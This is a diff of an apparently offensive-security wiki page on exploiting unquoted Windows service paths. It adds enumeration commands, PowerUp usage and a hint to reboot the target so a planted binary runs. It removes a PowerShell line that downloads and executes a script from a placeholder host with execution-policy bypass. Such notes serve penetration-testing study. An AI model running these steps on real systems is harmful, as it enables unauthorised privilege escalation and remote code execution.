@@ -28,20 +28,28 @@ In order to run SomeExecutable.exe, the system will interpret this path in the f
 
 {% tabs %}
 {% tab title="Enumerate" %}
-We can use wmic to enumerate it:
+We can use one of following methods to enumerate it:
+
+#### CMD
 
 ```powershell
+# Method 1
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
-
-wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
-
-gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
 
-Alternativly, we can use `Invoke-AllChecks` from PowerUp
+#### PowerShell
 
 ```powershell
-powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
+Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where {$_.StartMode -ne "Disabled" -and $_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"} | Format-List
+```
+
+#### PowerUp
+
+Alternatively, we can use `Get-UnquotedService` from [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).
+
+```powershell
+. .\PowerUp.ps1
+Get-UnquotedService
 ```
 {% endtab %}
 
@@ -72,6 +80,20 @@ net stop <Service_Name> && net start <Service_Name>
 sc stop <Service_Name>
 sc start <Service_Name>
 ```
+
+{% hint style="success" %}
+If we can't restart the service, we may check if it has `StartMode`set to `Auto`.&#x20;
+
+If so, we can reboot the target to trigger the new binary (we will need the `SeShutdownPrivilege`for that).
+
+```powershell
+#Exemple of getting StartMode for MySVC
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'MySVC'}
+
+#Reboot
+shutdown /r /t 0 
+```
+{% endhint %}
 {% endtab %}
 {% endtabs %}
 
